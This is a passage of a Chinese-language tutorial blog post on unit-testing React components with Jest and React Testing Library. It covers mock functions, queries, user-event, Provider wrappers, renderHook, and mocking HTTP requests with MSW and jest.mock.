起來 test.only() 忽略掉目前檔案中的其他測試，只執行 only 這個 case。 test.skip() 忽略掉這個 case。 Jest Mock一個 mock function 可能有很多種寫法，所以這邊簡單介紹幾個比較容易搞混的種類。 1. jest.fn() 與 jest.fn().mockImplementation 這兩個其實是等價的東西，只是如果你是寫 TypeScript 的話我覺得前者會比較方便一點： 12345678910111213describe('Mock compare', () =&gt; { test('mock function 1', () =&gt; { const mockFn = jest.fn((value: string) =&gt; value) console.log(mockFn('Hello')) // Hello }) test('mock function 2', () =&gt; { // 需要用 \"as\" 來指定 mockFn 的 type const mockFn = jest.fn().mockImplementation((value: string) =&gt; value) as jest.MockedFunction&lt; (value: string) =&gt; void &gt; console.log(mockFn('Ha Ha Ha')) // Ha Ha Ha })}) 2. jest.fn(() =&gt; ...) 與 jest.fn().mockReturn...() 這兩個也是差不多的東西，但在不關心參數的情況下我會建議用 mockReturn... 來處理： 123456789101112describe('Mock compare', () =&gt; { test('mock function 1', () =&gt; { const mockFn = jest.fn(() =&gt; true) console.log(mockFn()) // true expect(mockFn).toBeCalledTimes(1) }) test('mock function 2', () =&gt; { const mockFn = jest.fn().mockReturnValue(false) console.log(mockFn()) // false expect(mockFn).toBeCalledTimes(1) })}) 而當你關心參數時則會用 jest.fn(() =&gt; ...) 搭配 toBeCalledWith 來測試傳入的參數是否正確： 12345test('mock function call with right args', () =&gt; { const mockFn = jest.fn((value: boolean) =&gt; value) mockFn(true) expect(mockFn).toBeCalledWith(true)}) 所以我覺得這兩個的差別在於用途，當你只在意回傳值的時候會用 mockReturn...，在意參數的時候會用 jest.fn(() =&gt; ...)。 只想 mock 一部分的內容假設我們現在有一個 module 的內容長這樣： 12345678910export function getName(): string { return 'PeaNu'}export function getAge(): number { return 20}export const person = { name: 'PeaNu', age: 20} 然後 component 的內容如下： 1234567891011121314import { getAge, getName, person } from './utils'export const Module = () =&gt; { // 使用 module console.log('person', person) console.log('getName', getName()) console.log('getAge', getAge()) return ( &lt;div&gt; &lt;h2&gt;Module Test&lt;/h2&gt; &lt;/div&gt; )} 接著，如果我想要 mock 的只有 getName，那可以這樣寫： 1234567891011121314151617import { render } from '@testing-library/react'import { Module } from './Module'jest.mock('./utils', () =&gt; { return { // 把原本的 module 展開 ...jest.requireActual('./utils'), // 寫上要修改的屬性（覆寫） getName: jest.fn(() =&gt; 'ABC') }})describe('Module', () =&gt; { test('render correctly', () =&gt; { render(&lt;Module /&gt;) })}) 附註：就跟你在修改 Object 的特定 property 的概念很像。 出來的結果如下： 眼尖的話會注意到 module 中有一個 person，這是要做什麼用的？ 這是想示範如果你只想修改 person 中的指定屬性的話，甚至可以這樣做： 12345678910111213141516171819202122import { render } from '@testing-library/react'import { Module } from './Module'jest.mock('./utils', () =&gt; { return { ...jest.requireActual('./utils'), // 修改 person person: { // 把原本 person 的內容展開（注意後面的 .person） ...jest.requireActual('./utils').person, // 對要修改的屬性做修改 name: 'PPB' }, getName: jest.fn(() =&gt; 'ABC') }})describe('Module', () =&gt; { test('render correctly', () =&gt; { render(&lt;Module /&gt;) })}) 出來的結果如下： 總之，這一段只是想介紹 jest.mock 的 factory 功能，詳細可以參考官方文件的這段 RTL－Query一般在對 React Component 寫測試的時候，我們會有一個「Query（查詢）」動作，像這樣： 123456test('renders correctly !!', () =&gt; { render(&lt;Greet /&gt;) // 找出包含 hello 文字的 DOM 元素 const element = screen.getByText(/hello/i) expect(element).toBeInTheDocument()}) 以 RTL 的 convention 來說，要查詢單一元素的 query 有這些： getBy… queryBy… findBy… 多個元素的話： getAllBy… queryAllBy… findAllBy… 要注意的幾件事： findBy 一定要搭配 async await 使用 查詢單一元素的 query 如果找到多筆的話會報錯 盡量從 user 的角度去選擇適合的 query，藉此得知 a11y 的品質，詳細可以參考官方文件的 priority 段落 query 的用途query 是用來查詢不會渲染在畫面上的元素，例如： 12345678910111213export const Skills: React.FC = () =&gt; { const [isLoggedIn, setIsLoggedIn] = useState&lt;boolean&gt;(false) return ( &lt;div&gt; {isLoggedIn ? ( &lt;button&gt;Start Learn&lt;/button&gt; ) : ( &lt;button onClick={() =&gt; setIsLoggedIn(true)}&gt;Login&lt;/button&gt; )} &lt;/div&gt; )} 這時候如果想測試第一次渲染時 Start Learn 不會出現在畫面上的話，可能會這樣寫： 123456test('start learn button is not rendered', () =&gt; { render(&lt;Skills skills={skills} /&gt;) // 透過 getByRole 查詢 const buttonElement = screen.getByRole('button', { name: /start learn/i }) expect(buttonElement).not.toBeInTheDocument()}) 這樣子在跑測試的時候就會出錯，因為 getByRole 找不到那個按鈕。 所以這時候可以改用 query 的方式來查詢就不會出錯了： 123456test('start learn button is not rendered', () =&gt; { render(&lt;Skills skills={skills} /&gt;) // 改成 query const buttonElement = screen.queryByRole('button', { name: /start learn/i }) expect(buttonElement).not.toBeInTheDocument()}) 之所以可以這樣做是因為當 query 找不到指定元素時會回傳的是 null（如果是 queryAll 的話會回傳 []） ，而不是直接拋出一個 Error。我們是利用這一點來通過測試的。 find 的用途find 是用來查詢會根據 state 出現或消失的元素，例如： 1234567891011121314151617181920212223242526export const Skills: React.FC&lt;Props&gt; = (props) =&gt; { const [isLoggedIn, setIsLoggedIn] = useState&lt;boolean&gt;(false) // 500ms 後更新為登入 useEffect(() =&gt; { const timer = setTimeout(() =&gt; { setIsLoggedIn(true) }, 500) return () =&gt; clearTimeout(timer) }, []) return ( &lt;div&gt; &lt;ul&gt; {props.skills.map((skill) =&gt; ( &lt;li key={skill}&gt;{skill}&lt;/li&gt; ))} &lt;/ul&gt; {isLoggedIn ? ( &lt;button&gt;Start Learn&lt;/button&gt; ) : ( &lt;button onClick={() =&gt; setIsLoggedIn(true)}&gt;Login&lt;/button&gt; )} &lt;/div&gt; )} 這時候會碰到「非同步更新」的問題，因此用 getBy 或 query 的話沒辦法做正確的查詢。 所以要改用 find 來處理： 123456789test('start learn button is rendered after a little times', async () =&gt; { render(&lt;Skills skills={skills} /&gt;) const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) find 會回傳一個 Promise，當 1000ms 內找到元素時，就會 resolve 這個 Promise，反之則 reject。 上面刻意加上了 { timeout: 2000 } 這個 option，只是要提醒你如果預設的 1000ms 不夠用的話可以透過 option 來改寫。 RTL－Debuggingscreen.debug有時候你可能會想直接查看 DOM 元素的結構，這時候可以在測試中加上 screen.debug，RTL 會自動把 format 後的 DOM Tree 印出來： 1234567891011test('start learn button is rendered after a little times', async () =&gt; { render(&lt;Skills skills={skills} /&gt;) // 記得放在 render 後的位置 screen.debug() const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) logRoles如果你想要查看目前 DOM 上的所有 role，可以透過 logRoles 來查詢： 123456789101112131415// 1. 從 RTL 中引入import { render, screen, logRoles } from '@testing-library/react'test('start learn button is rendered after a little times', async () =&gt; { // 2. 把 render 的結果存到變數 const view = render(&lt;Skills skills={skills} /&gt;) // 3. 把 container 丟給 logRoles 處理 logRoles(view.container) const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) 之後就能用比較好讀的格式來查看所有 roles： 不過其實也可以用一個比較 tricky 的方法來做，就是用 screen.getByRole('')： 1234567891011test('start learn button is rendered after a little times', async () =&gt; { render(&lt;Skills skills={skills} /&gt;) // 對 getByRole 傳入空字串 screen.getByRole('') const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) 這招是故意讓 jest 拋出錯誤，與此同時自動列出我們可以搜尋的 roles 來達到同樣的效果： testing-playground一個讓你用 UI 來產生對應的 RTL Query 的擴充套件，用起來會像這樣： 只要選取想要的那個元素它就會自動產生適合的 query 給你，還蠻方便的。 RTL－Event當你想要針對「事件」來做測試時會用到 @testing-library/user-event 來處理。 比較需要注意的地方是 v13 跟 v14 的寫法不太一樣，所以這邊示範一下。 在 v13 的寫法是這樣： 1234567test('the count should become 1 after user click the button', () =&gt; { render(&lt;Counter /&gt;) const titleElement = screen.getByRole('heading') const btnElement = screen.getByRole('button') userEvent.click(btnElement) expect(titleElement).toHaveTextContent('1')}) 附註：使用者按下按鈕後數字應該從 0 變成 1 在 v14 的寫法是這樣： 12345678test('the count should become 1 after user click the button', async () =&gt; { userEvent.setup() render(&lt;Counter /&gt;) const titleElement = screen.getByRole('heading') const btnElement = screen.getByRole('button') await userEvent.click(btnElement) expect(titleElement).toHaveTextContent('1')}) 在 v14 中要用 userEvent 必須先執行 setup，並且 userEvent 變成是了非同步的 Promise ，所以要搭配 async await 來使用。 RTL－對 Provider 中的元件測試一般來說我們在寫 React 的時候都會用 Provider 來包住整個元件，像這樣： 123456789101112131415import { Mui } from 'components/Mui/Mui'import { AppProvider } from 'provider/AppProvider'import './App.css'function App() { return ( &lt;AppProvider&gt; &lt;div className='App'&gt; &lt;Mui /&gt; &lt;/div&gt; &lt;/AppProvider&gt; )}export default App 這裡的示範是用 Mui 提供的 theme 功能來讓預設的模式是「dark mode」，所以會用一個 Provider 來包住底下的所有元素。 不用太在意 AppProvider 的內容是什麼，只要知道我們需要這個 Provier 來讓 dark mode 能夠正常運作就好了。 然而當我們測試想測試 &lt;Mui&gt; 時，可能會寫出這樣的西： 123456789// Mui.tsximport { Typography } from '@mui/material'import { useTheme } from '@mui/material/styles'export const Mui = () =&gt; { const theme = useTheme() return &lt;Typography component='h1'&gt;{theme.palette.mode} mode&lt;/Typography&gt;} 1234567// Mui.test.tsxtest('renders correctly', () =&gt; { render(&lt;Mui /&gt;) const headingElement = screen.getByRole('heading') // 內容應該要有 dark 文字（如果是 dark mode 的話） expect(headingElement).toHaveTextContent(/dark/i)}) 注意 render 的內容只有 &lt;Mui&gt;，並沒有 Provier，所以這段測試是不會通過的。 你可能會想說「那我直接在 &lt;Mui&gt; 外面包一層 &lt;AppProvider&gt; 不就好了？」。這樣子確實可行，但這樣就沒有那麼 unit 了，所以一般會推薦這樣做： 12345678test('renders correctly', () =&gt; { render(&lt;Mui /&gt;, { // 傳入 option 設定 wrapper wrapper: AppProvider }) const headingElement = screen.getByRole('heading') expect(headingElement).toHaveTextContent(/dark/i)}) 這樣 jest 就會自動在背後補一層 Provider，就能正確的測試了。 客制化 render function以上面的例子來說，如果我想測試的東西都需要用到 Provider 的話，我就得在每一個 render 中都加入 wrapper 這個 option，其實有點麻煩對吧？ 要解決這個問題，可以參考 官方文件。裡面有教你如何針對 render 做客製化，這樣之後在用的時候就會方便許多。 現在拿剛剛的例子來改寫一下。首先，我們建立一個新的檔案，並寫入底下的內容： 1234567891011121314// test.utils.tsximport { ReactElement } from 'react'import { render, RenderOptions } from '@testing-library/react'import { AppProvider } from 'provider/AppProvider'// 客制化的 renderfunction customRender(ui: ReactElement, options?: Omit&lt;RenderOptions, 'wrapper'&gt;) { render(ui, { wrapper: AppProvider, ...options })}// 輸出原本的 rtl（所有內容）export * from '@testing-library/react'// 用 customRender 覆寫原本的 renderexport { customRender as render } 附註：其實就是把原本的 render 用 customRender 包裝後再輸出，搭配註解想一下應該不難理解。 然後再把剛剛的測試的內容改寫成這樣： 123456789// 改用我們客製化以後的 moduleimport { render, screen } from 'test.utils'import { Mui } from './Mui'test('renders correctly', () =&gt; { render(&lt;Mui /&gt;) const headingElement = screen.getByRole('heading') expect(headingElement).toHaveTextContent(/dark/i)}) 這樣子就不用在每一個地方都加上 wrapper 來處理了，真的方便許多！ RTL－對 custom hook 做測試假設我有一個 custom hook 如下： 1234567891011121314151617181920import { useState } from 'react'interface Props { initialCount?: number}// 因為 initialCount 是 optional，代表 Props 有機會是 undefined// 為了避免這樣的情形發生所以後面才會寫成 \"Props = {}\"export function useCounter({ initialCount = 0 }: Props = {}) { const [count, setCount] = useState&lt;number&gt;(initialCount) function increment() { setCount(count + 1) } function decrement() { setCount(count - 1) } return { count, increment, decrement }} 附註：關於 Props = {} 的細節可以參考這裡 就是一個很基本的 counter 而已，但現在要對這個 custom hook 測試的話會先碰到幾個問題： 沒辦法用 render 來渲染，因為 custom hook 並不包含 jsx 沒辦法直接在測試中呼叫 custom hook，因為 hook 只能在 component 中被呼叫 關於這一點 RTL 已經先幫你想好了，所以它提供了 renderHook 來讓你使用： 123456789// 引入 renderHookimport { renderHook } from '@testing-library/react'test('if not recieve props, initial count should be 0', () =&gt; { // 回傳值是一個 object，其中 result 是 useCounter 的內容 const { result } = renderHook(useCounter) // 透過 current 就可以存取到 useCounter 的回傳值 expect(result.current.count).toBe(0)}) 如果要對 custom hook 傳入參數的話，可以這樣子寫： 123456789101112import { renderHook } from '@testing-library/react'test('if recieve props, initial count should be that value', () =&gt; { const count = 10 // 透過 option 來設定 useCounter 的參數 const { result } = renderHook(useCounter, { initialProps: { initialCount: count } }) expect(result.current.count).toBe(count)}) 所以透過 renderHook 就可以對 custom hook 來做測試。 當測試會改變 state 時，需搭配 act 使用當我們想要測試 custom hook 中的 function 時，可能會很直覺的這樣寫： 12345678import { renderHook } from '@testing-library/react'test('if increment is invoked, count should increase by 1', () =&gt; { const { result } = renderHook(useCounter) // 執行 increment result.current.increment() expect(result.current.count).toBe(1)}) 接著就會看到這段錯誤訊息： 簡單來說，當我們執行 expect(...) 當下的那個 state 還不是更新以後的值，如果要讓確保 expect(...) 當下的 state 是最新的，要用 act 來包住更新 state 的 function： 123456789// 引入 actimport { act, renderHook } from '@testing-library/react'test('if increment is invoked, count should increase by 1', () =&gt; { const { result } = renderHook(useCounter) // 用 act 來包住 increment act(() =&gt; result.current.increment()) expect(result.current.count).toBe(1)}) 改寫成這樣以後就能確保 expect(...) 拿到的 state 會是最新的那一個。 RTL－利用 mock function 來測試以前在 一個做 Unit test 可能會用到的方法 有大概介紹過 mock function 的定義和用途，在 React 也有機會用到這個功能。 底下是要示範的例子： 123456789101112131415interface Props { count: number onIncrement?: () =&gt; void onDecrement?: () =&gt; void}export const Counter2: React.FC&lt;Props&gt; = (props) =&gt; { return ( &lt;div&gt; &lt;h1&gt;Count: {props.count}&lt;/h1&gt; {props.onIncrement &amp;&amp; &lt;button onClick={props.onIncrement}&gt;Increment&lt;/button&gt;} {props.onDecrement &amp;&amp; &lt;button onClick={props.onDecrement}&gt;Decrement&lt;/button&gt;} &lt;/div&gt; )} 接下來，當我們想測試 onIncrement 和 onDecrement 的時候，會碰到一個問題是：該如何測試這兩個 function？ 雖然這問題聽起有點奇怪，但你可以想一件事情。從 Counter2 的角度來思考的話，它的關注點並不會是這兩個 function 的內部的細節，畢竟我可以在 onIncrement 中把 count 加上 1，也可以加上 100，或其他各種可能；onDecrement 也是同理。 所以，Counter2 該關注的地方其實是： 這兩個 function 有沒有在在 onClick 的時候順利的被執行。 儘管這兩個 function 有可能因為本身邏輯沒寫好的關係導致程式出錯，但那都跟 Counter2 沒有直接的關係。 在知道關注點以後，你可能會這樣寫測試： 1234567891011121314151617181920test('handlers are invoked correctly', async () =&gt; { // 建立兩個沒意義的 function function incrementHandler() {} function decrementHandler() {} // 渲染元件 render(&lt;Counter2 count={10} onIncrement={incrementHandler} onIncrement={decrementHandler} /&gt;) // 按鈕元素 const incrementBtn = screen.getByRole('button', { name: /increment/i }) const decrementBtn = screen.getByRole('button', { name: /decrement/i }) // user 點擊 await userEvent.click(incrementBtn) await userEvent.click(decrementBtn) // 預期兩個 handler 各被呼叫一次 expect(incrementHandler).toBeCalledTimes(1) expect(decrementHandler).toBeCalledTimes(1)}) 但會看到這段錯誤： 簡單來說 jest 會規定你用它提供 mock function 來處理這段測試，所以會改寫成這樣： 12345678910111213141516test('handlers are invoked correctly', async () =&gt; { // 改成 mock function const incrementHandler = jest.fn() const decrementHandler = jest.fn() render(&lt;Counter2 count={10} onIncrement={incrementHandler} onDecrement={decrementHandler} /&gt;) const incrementBtn = screen.getByRole('button', { name: /increment/i }) const decrementBtn = screen.getByRole('button', { name: /decrement/i }) await userEvent.click(incrementBtn) await userEvent.click(decrementBtn) expect(incrementHandler).toBeCalledTimes(1) expect(decrementHandler).toBeCalledTimes(1)}) 所以碰到類似這種情況時可以用 mock function 來解決。 RTL－搭配 MSW 測試 HTTP Request在寫任何應用時一定會碰到 HTTP Request 的需求，這時候的測試得方式也會跟以往不太一樣，會相對複雜一些。 先來看這次的範例： 1234567891011121314151617181920212223242526272829303132333435363738import { useEffect, useState } from 'react'export const User = () =&gt; { // 寫成 custom hook 抽出去 const { users, error } = useUsers() return ( &lt;div&gt; &lt;h1&gt;User&lt;/h1&gt; {error &amp;&amp; &lt;p&gt;{error}&lt;/p&gt;} &lt;ul&gt; {users.map((user) =&gt; ( &lt;li key={user}&gt;{user}&lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; )}// fetch users 的邏輯function useUsers() { const [users, setUsers] = useState&lt;string[]&gt;([]) const [error, setErorr] = useState&lt;null | string&gt;(null) useEffect(() =&gt; { fetch('https://jsonplaceholder.typicode.com/users') .then(async (response) =&gt; { if (!response.ok) { return Promise.reject(await response.json()) } return response.json() }) .then((users: any[]) =&gt; setUsers(users.map((user) =&gt; user.name))) .catch((err: any) =&gt; setErorr(err.errorMessage)) }, []) return { users, error }} 這個範例是串接 jsonplaceholder 的 API，邏輯上應該不會太複雜，只是把抓到的 user 顯示在畫面上，失敗的話就顯示錯誤訊息。 那接下來該如何對這段 HTTP Request 做測試呢？在開始之前要先釐清一個觀念： 在包含 API 的單元測試中，我們只能用 mock 的方式去模擬 API 的運行。想要完整的測試 API + App 本身，那該做的是 E2E 測試而不是單元測試。 畢竟 API 相關的事情會牽涉到 server，對單元測試來說這個 scope 太廣了，所以慣例上會自己 mock 一個 api server 出來做測試，也就是等一下要介紹的套件：Mock Service Worker (MSW) 安裝與配置 MSWmsw 是一個用來模擬 API 的套件，只要用跟 express 類似的語法就能快速建起一個 API server，並且在真正的 request 送出以前透過「攔截」的方式來取代原本的 request。 1. 安裝 MSW 123npm install msw --save-dev# oryarn add msw --dev 2. 建立配置檔案 12345678910├── src│&nbsp;&nbsp; ├── components│&nbsp;&nbsp; │&nbsp;&nbsp; └── User│&nbsp;&nbsp; │&nbsp;&nbsp; ├── User.test.tsx│&nbsp;&nbsp; │&nbsp;&nbsp; └── User.tsx│&nbsp;&nbsp; ├── mocks &lt;- 這個│&nbsp;&nbsp; │&nbsp;&nbsp; ├── handlers.ts &lt;- 這個│&nbsp;&nbsp; │&nbsp;&nbsp; └── server.ts &lt;- 這個├── tsconfig.json└── yarn.lock handlers.ts 是用來設定 mock 的 API 處理，內容會是這樣： 1234567891011// msw 提供 Restful 和 GraphQL 兩種選擇import { rest } from 'msw'// handlers 可以有多個所以是陣列結構，每一個 item 代表一個 handlerexport const handlers = [ // 要攔截的 request（對應到 User.tsx 中的 fetch） rest.get('https://jsonplaceholder.typicode.com/users', (req, res, ctx) =&gt; { // 設定 response return res(ctx.status(200), ctx.json([{ name: 'PeaNu' }, { name: 'PPB' }, { name: 'Ariana' }])) })] 稍微解釋一下這裡的原理，設定這隻檔案的用意是當我們在 User.tsx 去對 jsonplaceholder 發出 GET 請求時，msw 會先檢查 handlers 中是否有對應的 API，若有的話就會攔截下來丟給 handlers 處理。也就是說 API 實際上不會發送到 jsonplaceholder 那邊，而是 msw 的 handler。 server.ts 是用來設置 server 的地方： 12345import { setupServer } from 'msw/node'// 引入前面的 handlersimport { handlers } from './handlers'// server 本體export const server = setupServer(...handlers) 3. 設置 setupTest.ts hooks 除了設定 server 以外，我們也得對 jest 本身做一些調整，否則它不會知道我們有 mock 一個 server 給元件使用： 123456789101112131415// jest-dom adds custom jest matchers for asserting on DOM nodes.// allows you to do things like:// expect(element).toHaveTextContent(/react/i)// learn more: https://github.com/testing-library/jest-domimport '@testing-library/jest-dom'// 需要添加的設定是下面這些import { server } from './mocks/server'// Establish API mocking before all tests.beforeAll(() =&gt; server.listen())// Reset any request handlers that we may add during the tests,// so they don't affect other tests.afterEach(() =&gt; server.resetHandlers())// Clean up after the tests are finished.afterAll(() =&gt; server.close()) 其實就是在不同時間點做一些設定而已： beforeALl：在測試執行之前，架好 server 的 lstener afterEach：單一個 test 跑完時，重設 handler 避免互相干擾 afterAll：所有測試跑完後，關閉 server 這邊只是做一個全域設定來省掉一些麻煩而已。 撰寫測試msw 設定好之後就可以開始來寫測試了，直接來看 code： 12345678910111213141516171819202122describe('Users', () =&gt; { // happy part test('renders list of items', async () =&gt; { render(&lt;User /&gt;) const listItem = await screen.findAllByRole('listitem') // mock server 回傳的資料有 3 筆，所以預期要有 3 個 &lt;li&gt; expect(listItem).toHaveLength(3) }) // sad part（錯誤處裡） test('renders error message', async () =&gt; { const errorMessage = 'System Internal Error.' server.use( rest.get('https://jsonplaceholder.typicode.com/users', (req, res, ctx) =&gt; { return res(ctx.status(500), ctx.json({ errorMessage })) }) ) render(&lt;User /&gt;) const error = await screen.findByText(errorMessage) expect(error).toBeInTheDocument() })}) 這邊同時測試了成功和失敗的結果。 首先成功的部分就跟平常的測試差不多，因為前面有做好設定了所以 jest 會自動去讓 mock server 攔截 &lt;User /&gt; 中的 request。 至於失敗的部分也要做一些調整，因為我們沒辦法讓單一個 handler 同時處理成功和失敗，所以這邊的做法是直接在測試中寫另一個 handler 來拋出 500 erorr，這樣子就可以一次做兩種測試了。 RTL－另一種測試 HTTP Request 的方式前面有介紹怎麼用 msw 套件來測試 HTTP Request，但如果你沒有想要那麼直接模擬 server 的特性（像是會回傳 HTTP status code、等待回傳的時間等等）。那其實不一定要利用 msw 來建一個模擬 server 做測試，只要用 jest 提供的 mock function 就行了。 來看一個實際的例子。 getUser.ts： 1234567// 打 API 拿資料的 functionexport async function getUser() { return await fetch('https://jsonplaceholder.typicode.com/users/') .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error)} Users.tsx： 1234567891011121314151617181920212223242526272829import { useEffect, useState } from 'react'import { getUser } from './getUser'function Users() { const [users, setUsers] = useState&lt;any[]&gt;([]) const [errorMessage, setErrorMessage] = useState&lt;null | string&gt;(null) useEffect(() =&gt; { // 利用 getUser 取得 user list getUser() .then((users) =&gt; setUsers(users)) .catch((error) =&gt; setErrorMessage(error.message)) }, []) // 成功的話渲染 user 列表，失敗的話顯示錯誤訊息 return ( &lt;div className='App'&gt; &lt;h2&gt;Users:&lt;/h2&gt; &lt;ul&gt; {users.map((user: any) =&gt; ( &lt;li key={user.name}&gt;{user.name}&lt;/li&gt; ))} &lt;/ul&gt; {errorMessage &amp;&amp; &lt;p&gt;{errorMessage}&lt;/p&gt;} &lt;/div&gt; )}export default Users Users.test.tsx： 123456789101112131415161718192021222324252627282930import { render, screen } from '@testing-library/react'import { getUser } from './getUser'import Users from './Users'// 告訴 jest 我們要 mock 的模組位置，他會自動拿來做 mock//（我當初也有點疑惑這怎麼做到的，但不要懷疑就是這樣做）jest.mock('./getUser')// 為我們要 mock 的 function 定義 type（這樣才有正確的 type check）const mockGetUser = getUser as jest.MockedFunction&lt;typeof getUser&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }] mockGetUser.mockResolvedValueOnce(response) render(&lt;Users /&gt;) expect(mockGetUser).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(2) screen.debug()})test('call api failed', async () =&gt; { const message = 'System Internal Error' mockGetUser.mockRejectedValueOnce(new Error(message)) render(&lt;Users /&gt;) expect(mockGetUser).toHaveBeenCalledTimes(1) const errorText = await screen.findByText(message) expect(errorText).toBeInTheDocument() screen.debug()}) 測試結果一（fetch 成功）： 測試結果二（fetch 失敗）： 還蠻簡潔的對吧？不過缺點就是沒那麼接近實際的 server 而已，因為不會有實際去打 API 的行為發生。 jest.mock 的用法如果剛剛的範例你看得懂的話可以無視這一段，這段是想更深入解釋一下 mock 的用法，因為我自己當初在這邊還卡蠻久的 QQ 這邊會介紹的方法有底下幾個： jest.mock mockResolvedValue mockRejectedValue 來看這次的範例： 1234567891011export function getCount(): Promise&lt;string | number&gt; { return new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { const count = Math.random() * 10 if (count &gt; 5) { return reject('Faild') } return resolve(count) }, 500) })} 只是個 0.5 秒後會回傳數字，但有機率失敗的例子。 假設說我們現在想要 mock 這個 function 的話，可以這樣子寫： 123456789101112131415161718192021222324252627282930import { getCount } from './getCount'// 告訴 jest 我們想要 mock 的 &lt;Source&gt;（引入路徑）jest.mock('./getCount')// 定義 mock function 的 type（TypeScript 才需要）const mockGetCount = getCount as jest.MockedFunction&lt;typeof getCount&gt;test('should receive correctly value', async () =&gt; { const response = 50 // 定義 promise 被 resolve 後回傳的值（50） mockGetCount.mockResolvedValue(response) // 執行 mock function const count = await mockGetCount() // 預期 count = 50 expect(count).toBe(response)})test('should receive error', async () =&gt; { const response = 'Ooops' // 定義 promise 被 reject 後回傳的值（'Oops'） mockGetCount.mockRejectedValue(new Error(response)) // 用變數來儲存回傳結果 let errorMessage: string await mockGetCount() // reject 會進入 catch 區塊，接著把值存入剛剛的變數 .catch((error) =&gt; (errorMessage = error.message)) // 最後執行 assertion（斷言） .finally(() =&gt; expect(errorMessage).toBe(response))}) 雖然用了很懶人的註解法來解釋，不過我覺得以這個範例來說應該不難理解。如果還是有疑問的話建議到上面的官方文件連結點進去看一下每一個 method 大概在幹嘛應該會更清楚一點。 問題集當你的 api function 比較複雜時的 mock 方式由於我自己工作上的專案要打的 API 數量非常之多，所以 call api 的 method 不會是那種像 getUser 的單一個項目來處理，而是會包裝 Object 或 OOP 的形式，像這樣子： 1234567891011121314151617export function User() { async function getAll() { return await fetch('https://jsonplaceholder.typicode.com/users/') .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) } async function getSingle(id: number) { return await fetch('https://jsonplaceholder.typicode.com/users/' + id) .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) } // 以此類推... return { getAll, getSingle }} 或是這樣子（class 寫法）： 123456789101112131415export class User { static asnyc getAll() { return await fetch('https://jsonplaceholder.typicode.com/users/') .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) }static async getSingle(id: number) { return await fetch('https://jsonplaceholder.typicode.com/users/' + id) .then((response) =&gt; response.json()) .then((data) =&gt; data) .catch((error) =&gt; error) } // 以此類推...} 這兩種 mock 的寫法等一下都會介紹，這裡來看第一種的解法。 首先如果是第一個 api，那在 component 中使用的方式應該會是這樣： 1234567891011121314151617181920212223242526272829function Users() { // 執行 User 取出所有 api 的 methods const user = User() const [users, setUsers] = useState&lt;any[]&gt;([]) const [errorMessage, setErrorMessage] = useState&lt;null | string&gt;(null) useEffect(() =&gt; { user .getAll() .then((users) =&gt; setUsers(users)) .catch((error) =&gt; setErrorMessage(error.message)) }, []) return ( &lt;div className='App'&gt; &lt;h2&gt;Users:&lt;/h2&gt; &lt;ul&gt; {users.map((user: any) =&gt; ( &lt;li className='hello' key={user.name}&gt; {user.name} &lt;/li&gt; ))} &lt;/ul&gt; {errorMessage &amp;&amp; &lt;p&gt;{errorMessage}&lt;/p&gt;} &lt;/div&gt; )}export default Users 這時候會碰到的問題是：「該怎麼對 getAll 做 mock？」 我一開始的做法是這樣： 12345678910111213141516171819import { render, screen } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedFunction&lt;typeof User&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] // 修改 getAll 的回傳值 mockUser().getAll.mockReturnValue(response) // render the Users component render(&lt;Users /&gt;) expect(mockUser).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(3)}) 但 mockUser().getAll.mockReturnValue(response) 這段是有問題的： 後來我也試過各式各樣的方法，但還是都不行。直到後來爬文爬出了一些心得以後，才發現整體思路應該要轉換一下才對。 首先，剛剛的想法是聚焦在怎麼修改 component 中的 getAll，但這樣想是不對的，因為對 component 來說它實際用的是「把 User 的回傳值裡面的 getAll 拿來用」。也就是說你應該要修改的是整個 User 的回傳值，而不是單純只改 getAll 的回傳值。 聽起來可能有點抽象，所以用 code 來解釋吧： 123456789101112131415161718192021import { render, screen } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedFunction&lt;typeof User&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] // 建立 getAll 的 mock function const getAll = jest.fn().mockResolvedValue(response) // 設定 mockUser 的回傳值（上面的 getAll mock function） mockUser.mockReturnValue({ getAll }) // render the Users component render(&lt;Users /&gt;) expect(mockUser).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(3)}) 簡單來說，除了為原本的 User 建立 mock 以外，你也得對他的回傳值的 function 做 mock。算是一個比較 tricky 的做法，但以這個案例來說我目前只知道這種解法而已 QQ 接下來是第二種 class 的作法，概念上跟剛剛很類似，所以這裡就直接附 code 了： 1234567891011121314151617181920import { render, screen } from '@testing-library/react'import { User } from './getUser'import Users from './Users'jest.mock('./getUser')const mockUser = User as jest.MockedClass&lt;typeof User&gt;test('call api correctly', async () =&gt; { const response = [{ name: 'Leanne Graham' }, { name: 'Ervin Howell' }, { name: 'Test Other' }] // getAll 的 mock const mockGetAll = jest.fn().mockResolvedValue(response) // 把 getAll 修改為 mock function mockUser.getAll = mockGetAll render(&lt;Users /&gt;) expect(mockUser.getAll).toHaveBeenCalledTimes(1) const listItem = await screen.findAllByRole('listitem') expect(listItem).toHaveLength(3)}) 明明 mock 有被執行，為什麼 